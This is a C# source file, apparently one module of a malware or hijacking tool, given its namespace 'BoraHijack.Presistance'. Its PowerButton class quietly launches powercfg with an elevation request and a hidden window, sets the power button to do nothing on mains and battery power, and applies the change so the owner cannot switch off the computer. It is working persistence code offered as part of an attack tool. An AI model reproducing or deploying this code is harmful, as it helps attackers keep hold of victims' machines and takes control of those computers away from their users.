using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BoraHijack.Presistance
{
    class PowerButton
    {
        public static void MainPWRB()
        {
            try
            {
                // disable power button (set to "do nothing") on AC
                RunPowerCfg("/setacvalueindex SCHEME_CURRENT SUB_BUTTONS POWERBUTTONACTION 0");

                // disable power button on DC (battery), optional for laptops
                RunPowerCfg("/setdcvalueindex SCHEME_CURRENT SUB_BUTTONS POWERBUTTONACTION 0");

                // apply the scheme
                RunPowerCfg("/S SCHEME_CURRENT");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{ex.Message}");
            }
        }

        static void RunPowerCfg(string args)
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powercfg",
                Arguments = args,
                Verb = "runas",
                UseShellExecute = true,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                process.WaitForExit();
                if (process.ExitCode != 0)
                {
                    Console.WriteLine($"{process.ExitCode}");
                }
            }
        }
    }
}
